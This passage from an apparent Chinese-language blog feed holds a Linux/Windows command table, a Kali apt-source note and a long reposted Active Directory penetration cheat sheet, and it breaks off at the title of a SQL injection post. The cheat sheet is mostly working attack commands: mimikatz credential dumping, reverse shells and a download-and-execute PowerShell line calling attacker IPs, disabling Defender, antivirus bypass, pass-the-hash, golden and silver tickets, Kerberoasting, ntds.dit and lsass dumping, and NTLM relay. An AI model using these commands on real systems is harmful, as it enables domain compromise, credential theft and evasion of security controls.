      
        <content type="html"><![CDATA[<p>Windows不区分大小写，Linux区分大小写的。 </p><table><thead><tr><th>文件目录操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>批处理</td><td>.sh</td><td>.bat</td></tr><tr><td>帮助</td><td>cmd  –help / -h</td><td></td></tr><tr><td>列出目录文件</td><td>ls/  ls -l</td><td>dir</td></tr><tr><td>改变当前目录</td><td>cd</td><td>cd</td></tr><tr><td>进父目录</td><td>cd  …</td><td>cd  …</td></tr><tr><td>进home目录</td><td>cd  ~</td><td></td></tr><tr><td>复制</td><td>cp</td><td>copy</td></tr><tr><td>删除</td><td>rm  file_name</td><td>del  file_name</td></tr><tr><td>建目录</td><td>mkdir  folderName</td><td>md  folderName</td></tr><tr><td>建文件</td><td>touch  fileName</td><td>touch  fileName</td></tr><tr><td>删目录</td><td>rmdir  folderName</td><td>rmdir  folderName</td></tr><tr><td>设置目录文件权限</td><td>chmod  u+rwx file</td><td></td></tr><tr><td>设置目录文件所有者</td><td>chown  user.group file</td><td></td></tr></tbody></table><table><thead><tr><th>文件内容操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示文件内容</td><td>cat</td><td>type</td></tr><tr><td></td><td>more，less</td><td>more</td></tr><tr><td></td><td>head、tail</td><td></td></tr><tr><td>统计行数</td><td>wc</td><td></td></tr><tr><td>显示文件信息</td><td>file</td><td></td></tr><tr><td>查找文件</td><td>find  /bin -name ls</td><td></td></tr><tr><td>定位可执行文件位置</td><td>which</td><td></td></tr><tr><td>在文本文件内查找</td><td>grep  str1 1.txt</td><td>find</td></tr><tr><td>启动运行程序</td><td>gnome-open/open</td><td>start</td></tr></tbody></table><table><thead><tr><th>系统信息查询</th><th></th><th align="center"></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td align="center">Windows</td></tr><tr><td>显示内核版本</td><td>uname  -a</td><td align="center"></td></tr><tr><td>显示发布版本</td><td>lsb_release  -a</td><td align="center"></td></tr><tr><td></td><td>cat  /etc/issue</td><td align="center"></td></tr><tr><td>显示id信息</td><td>id/whoami</td><td align="center"></td></tr><tr><td>显示当前登陆用户</td><td>who</td><td align="center"></td></tr><tr><td>显示当前环境信息</td><td>env</td><td align="center"></td></tr><tr><td>显示启动中检测到的硬件信息</td><td>dmesg</td><td align="center"></td></tr><tr><td>显示系统的PCI设备</td><td>lspci</td><td align="center"></td></tr><tr><td>显示系统的USB</td><td>lsusb</td><td align="center"></td></tr><tr><td>显示cpu信息</td><td>less  /proc/cpuinfo</td><td align="center"></td></tr><tr><td>显示内存</td><td>less  /proc/menminfo</td><td align="center"></td></tr><tr><td>显示硬盘存储信息</td><td>df  -h</td><td align="center"></td></tr></tbody></table><table><thead><tr><th>进程/任务控制</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示进程信息</td><td>ps  -auxf</td><td></td></tr><tr><td>杀死进程</td><td>kill  proc_id</td><td></td></tr><tr><td>杀死所有</td><td>killall  postgresql</td><td></td></tr><tr><td>暂停中断当前前台任务</td><td>ctrl  - z</td><td></td></tr><tr><td>恢复任务到后台</td><td>bg</td><td></td></tr><tr><td>恢复任务到前台</td><td>fg</td><td></td></tr></tbody></table><table><thead><tr><th>网络命令</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示启动的网络服务</td><td>netstat  -anli less</td><td>netstat</td></tr><tr><td>显示路由表信息</td><td>netstat  -r</td><td>netstat  -r</td></tr><tr><td>显示ip</td><td>ip  a/ifconfig</td><td>ipconfig</td></tr><tr><td>显示防火墙信息</td><td>iptables  -list</td><td></td></tr><tr><td>远程登陆</td><td>ssh  user@host</td><td></td></tr><tr><td>发送ping信息</td><td>ping  ip</td><td>ping  ip</td></tr><tr><td>命令行下载</td><td>wget  url/curl -o url</td><td></td></tr></tbody></table><table><thead><tr><th>用户管理</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>修改命令</td><td>passwd</td><td></td></tr><tr><td>创建用户</td><td>useradd</td><td></td></tr><tr><td>删除用户</td><td>userdel</td><td></td></tr><tr><td>修改用户</td><td>usermod</td><td></td></tr><tr><td>退出</td><td>exit  / ctrl + D</td><td></td></tr><tr><td>切换用户至（默认root）</td><td>su  [-]user</td><td></td></tr><tr><td>以su后的权限执行</td><td>sudo  -u user cmd</td><td></td></tr></tbody></table><table><thead><tr><th>其他</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示日期时间</td><td>date</td><td>date</td></tr><tr><td>日历</td><td>cal2014</td><td></td></tr><tr><td>清除屏幕</td><td>clear</td><td>cls</td></tr><tr><td>搜索软件包</td><td>yum  search tree</td><td></td></tr><tr><td>删除软件包</td><td>yum  remove pkg_name</td><td></td></tr><tr><td>安装软件包</td><td>yum  install pkg_name</td><td></td></tr><tr><td>重启系统</td><td>reboot</td><td></td></tr><tr><td>关闭系统</td><td>halt  -p</td><td></td></tr><tr><td>设置环境变量</td><td>export  PATH=SPATH：～/bin</td><td>set</td></tr><tr><td>显示信息/环境变量</td><td>echo  $HOME</td><td>echo</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apt-get kali源</title>
      <link href="/posts/22626/"/>
      <url>/posts/22626/</url>
      
        <content type="html"><![CDATA[<p>编辑 source.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加 kali源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.cloud.tencent.com/kali/ kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.cloud.tencent.com/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>安装gnupg2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y gnupg2</span><br></pre></td></tr></table></figure><p>获取 公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver [keyserver.ubuntu.com](http://keyserver.ubuntu.com/) --recv ED444FF07D8D0BF6apt update;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透常用命令</title>
      <link href="/posts/45214/"/>
      <url>/posts/45214/</url>
      
        <content type="html"><![CDATA[<p>转载自guokeya<br><a href="https://guokeya.github.io/post/tFK-eJTet/">https://guokeya.github.io/post/tFK-eJTet/</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug    <span class="comment">#提升权限</span></span><br><span class="line">sekurlsa::logonpasswords            <span class="comment">#抓取密码</span></span><br><span class="line">net view /domain:XXX<span class="comment">#查看XXX域中的机器列表</span></span><br><span class="line">net view /domain<span class="comment">#查看内网中有多少个域</span></span><br><span class="line">setspn <span class="literal">-T</span> jumbolab.com <span class="literal">-Q</span> */* <span class="comment">#SPN扫描快速寻找内网中注册的服务</span></span><br><span class="line">net user /domain <span class="comment">#查看域用户</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">#查看域管</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain <span class="comment">#查看域控制器 域控主机名</span></span><br><span class="line">net  localgroup administrators /domain   <span class="comment">#登录本机的域管理员</span></span><br><span class="line">net  localgroup administrators workgroup \user /add  <span class="comment">#域用户添加到本机\</span></span><br><span class="line">net time /domain <span class="comment">#定位域控主机名</span></span><br><span class="line">nltest /domain_trusts<span class="comment">#列出域信任关系</span></span><br><span class="line">cmdkey /list <span class="comment">#远程连接凭据</span></span><br><span class="line">quser <span class="comment">#查看在线用户</span></span><br><span class="line">net config workstation<span class="comment">#查看当前登陆域</span></span><br><span class="line">nslookup <span class="literal">-type</span>=ns domain.com<span class="comment">#域传输漏洞。查找所有的DNS解析</span></span><br><span class="line">dsquery computer domainroot <span class="literal">-limit</span> <span class="number">65535</span> &amp;&amp; net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain <span class="comment">#列出该域内所有机器名</span></span><br><span class="line">dsquery user domainroot <span class="literal">-limit</span> <span class="number">65535</span> &amp;&amp; net user /domain <span class="comment">#列出该域内所有用户名</span></span><br><span class="line">dsquery subnet <span class="comment">#列出该域内网段划分</span></span><br><span class="line">dsquery <span class="built_in">group</span> &amp;&amp; net <span class="built_in">group</span> /domain  <span class="comment">#列出该域内分组 </span></span><br><span class="line">dsquery ou <span class="comment">#列出该域内组织单位 </span></span><br><span class="line">dsquery server &amp;&amp; net time /domain  <span class="comment">#列出该域内域控制器 </span></span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line">列出杀软</span><br><span class="line">wmic product get name,version <span class="comment">#查看安装的软件</span></span><br><span class="line">dnsdump.exe <span class="literal">-u</span> 域名\与用户 <span class="literal">-p</span> 域密码 域控机器名 <span class="comment">#用普通域用户获取域内所有DNS解析</span></span><br><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> <span class="selector-tag">@</span> ping <span class="number">10.233</span>.<span class="number">33</span>.%i <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span>|find /i <span class="string">&quot;ttl=&quot;</span> <span class="comment">#主机发现</span></span><br><span class="line">find / <span class="literal">-type</span> f <span class="literal">-uid</span> +<span class="number">0</span> <span class="comment">#找不是root用户编辑的文件。用于找密码 tee可以替代&gt;</span></span><br></pre></td></tr></table></figure><h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP\ipc$ &quot;密码&quot; /user:administrator</span><br><span class="line">#建立IPC连接</span><br><span class="line">net time \\IP</span><br><span class="line">#获取远程IP的时间</span><br><span class="line">copy calc.bat \\IP\C$</span><br><span class="line">#把本地的calc.bat传到目标C盘</span><br><span class="line">at \\IP 21:41 c:\calc.bat</span><br><span class="line">#创建计划任务</span><br><span class="line">at \\IP 21:41 cmd.exe /c  &quot;ipconfig &gt; c:\1.txt&quot;</span><br><span class="line">#直接执行命令</span><br><span class="line">type \\IP\C$\1.txt</span><br><span class="line">#获取命令执行结果</span><br><span class="line">schtasks /create /s IP /tn 计划任务名 /sconstart /tr c:\calc.bat /ru system /f</span><br><span class="line">#用schtasks命令创建计划任务</span><br><span class="line">schtasks /delete /s IP /tn &quot;计划任务名&quot; /f </span><br></pre></td></tr></table></figure><p>WMICEXEC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:IP /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br><span class="line">type \\IP\C$\ip.txt</span><br><span class="line">系统自带的WMIC命令。执行无日志</span><br><span class="line">wmiexec.py Username:Password@IP</span><br></pre></td></tr></table></figure><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">可绕腾讯电脑管家</span><br></pre></td></tr></table></figure><h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl弹shell</span><br><span class="line">服务端:</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">powershell弹shell</span><br><span class="line">服务端：</span><br><span class="line">Import-Module .\powercat.ps1;powercat -l -v -p 443 -t 1000</span><br><span class="line">靶机：</span><br><span class="line">powershell -command &quot;.\reverseshell.ps1&quot;   </span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">post/multi/recon/local_exploit_suggest</span><br><span class="line">windows/local/bypassuac_dotnet_profiler</span><br><span class="line">自动寻找存在的提权漏洞</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py  --update</span><br><span class="line">systeminfo &gt; info.txt</span><br><span class="line">python windows-exploit-suggester.py -d 2017-06-14-mssb.xls -i info.txt</span><br><span class="line">CVE提权辅助脚本</span><br></pre></td></tr></table></figure><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">本地复现了下。用普通域用户名和密码去创建一个连接。会显示拒绝访问</span><br><span class="line">MS14-068.exe -u Administrator@abc.com -p 123@abcD -s S-1-5-21-294942478-3080431383-2839947409-500 -d 192.168.0.3</span><br><span class="line">#会在当前目录生成一个票据</span><br><span class="line">kerberos::purge </span><br><span class="line">#清空当前的票据</span><br><span class="line">kerberos::ptc 凭证地址</span><br><span class="line">#注入票据 </span><br><span class="line">创建票据。mimikatz导入。就可以访问了。但权限还是普通域用户权限</span><br><span class="line">psesec.exe -accepteula \\dc.abc.com -s cmd.exe</span><br><span class="line">可以配合psexec -s 得到一个System shell</span><br></pre></td></tr></table></figure><p>mssql弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/mssql/mssql_clr_payload</span><br></pre></td></tr></table></figure><h1 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1&#x27;)&quot;</span><br><span class="line">#下载文件并且执行</span><br></pre></td></tr></table></figure><h1 id="Windows关闭Defender"><a href="#Windows关闭Defender" class="headerlink" title="Windows关闭Defender"></a>Windows关闭Defender</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h1 id="PTH-Hash传递攻击"><a href="#PTH-Hash传递攻击" class="headerlink" title="PTH(Hash传递攻击)"></a>PTH(Hash传递攻击)</h1><p>就是利用ntlm去拿一个shell。psexec。wmiexec都是PTH的利用。可以用hash。直接绕过验证访问服务<br>利用条件：已知用户ntlm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#提升权限</span><br><span class="line">sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:161cff084477fe596a5db81874498a24 /run:powershell.exe</span><br><span class="line">#mimikatz执行</span><br><span class="line">psexec会被日志纪录</span><br></pre></td></tr></table></figure><p>msf中也有模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br><span class="line">exploit/windows/smb/psexec_psh(Powershell版本)</span><br></pre></td></tr></table></figure><h1 id="PTT-票据传递攻击"><a href="#PTT-票据传递攻击" class="headerlink" title="PTT(票据传递攻击)"></a>PTT(票据传递攻击)</h1><p>白银票据：<br>就是利用票据。去得到一个shell。权限还是当前用户。ms14-068就是这个<br>利用条件：<br>已知域用户SID<br>已知域用户NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116-1103 /domain:offensive.local /target:Offensive-SQL1:1433 /service:MSSQLSvc /rc4: 161cff084477fe596a5db81874498a24 /user:idontexist /id:1103 /ptt</span><br><span class="line">#sid-&gt;域用户的SID</span><br><span class="line">#target-&gt;开启了服务的目标</span><br><span class="line">#service-&gt;攻击的服务类型</span><br><span class="line">#rc4-&gt;域用户的NTLM</span><br><span class="line">#user-&gt;随便写</span><br><span class="line">#id-&gt;域用户的ID</span><br><span class="line">misc::cmd</span><br><span class="line">#派发shell</span><br></pre></td></tr></table></figure><p>黄金票据<br>利用krbtgt密码的hash。获得域管权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">#清空票据</span><br><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116 /domain:offensive.local /rc4:61d83c569b93bfcd4ca2087011361caa /user:idontexist /id:500</span><br><span class="line">#输入krbtgt的ntlm。SUID。生成票据</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line">#导入票据</span><br><span class="line">misc::cmd</span><br><span class="line">#得到shell</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line">#powershell执行。请求票据</span><br><span class="line"></span><br><span class="line">kerberos::list /export</span><br><span class="line">#mimikatz执行。提取刚刚获得的票据</span><br><span class="line"></span><br><span class="line">python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br><span class="line">利用pass.txt爆破刚刚提取出来的票据</span><br></pre></td></tr></table></figure><p>Mssql xp_cmdshell被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><h1 id="ntds-dit"><a href="#ntds-dit" class="headerlink" title="ntds.dit"></a>ntds.dit</h1><p>用自带的工具diskshadow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c:\common.txt</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% i:</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy i:\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后去c:/windows/system32执行<code>diskshadow /s c:\command.txt</code><br>就能得到ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">. .\Invoke-NinjaCopy.ps1</span><br><span class="line">#导入脚本</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -Verbose -LocalDestination &#x27;C:\Users\dbadmin\Desktop    \ntds.dit&#x27;</span><br><span class="line">#导出ntds.dit</span><br><span class="line">reg save HKLM\SYSTEM C:\Users\dbadmin\Desktop\SYS</span><br><span class="line">#导出SYSTEM</span><br><span class="line">Copy-Item &#x27;\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit&#x27;-Destination &#x27;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit&#x27;</span><br><span class="line">#复制到远程主机上</span><br></pre></td></tr></table></figure><h1 id="修复ntds-dit"><a href="#修复ntds-dit" class="headerlink" title="修复ntds.dit"></a>修复ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl.exe /p &#x27;C:\Users\dbadmin\Desktop\ntds.dit&#x27; /!10240 /8 /o</span><br></pre></td></tr></table></figure><h1 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一。powershell</span><br><span class="line">Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">$key = Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\Users\alice\Desktop\tools\ntds.dit&#x27; -BootKey $key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二。利用impacket-secretsdump</span><br><span class="line">impacket-secretsdump -system /root/Desktop/NTDS/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击-1"><a href="#Kerberoasting攻击-1" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">. .\GetUserSPNs.ps1</span><br><span class="line"> Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line"> mimikatz # kerberos::list /export</span><br><span class="line"> python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br></pre></td></tr></table></figure><h1 id="导出内存"><a href="#导出内存" class="headerlink" title="导出内存"></a>导出内存</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 924 C:\lsass.dmp full</span><br><span class="line"></span><br><span class="line">powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full&quot;</span><br><span class="line">#1316是lsass的进程ID。tasklist /svc|findstr lsass</span><br><span class="line"></span><br><span class="line">SqlDumper.exe 1316 0 0x01100</span><br><span class="line">#mssql的工具。1316照样是lsass.exe的PID</span><br><span class="line">sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">SharpDump.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要system权限</span><br><span class="line">C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.0\createdump.exe</span><br><span class="line">createdump.exe -u -f  xxx.dump  pid</span><br></pre></td></tr></table></figure><p>HASH Relay</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br><span class="line">python MultiRelay.py -t 192.168.0.4 -u ALL</span><br><span class="line">//要获取shell的目标IP</span><br><span class="line">然后客户机去访问192.168.0.4，中继到shell</span><br></pre></td></tr></table></figure><p>绕过360添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Argue net1 xxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">execute net1 user 123 123 /add</span><br><span class="line"></span><br><span class="line">https://github.com/lengjibo/RedTeamTools/tree/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7</span><br><span class="line">帐号：hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/posts/31899/"/>
      <url>/posts/31899/</url>
      
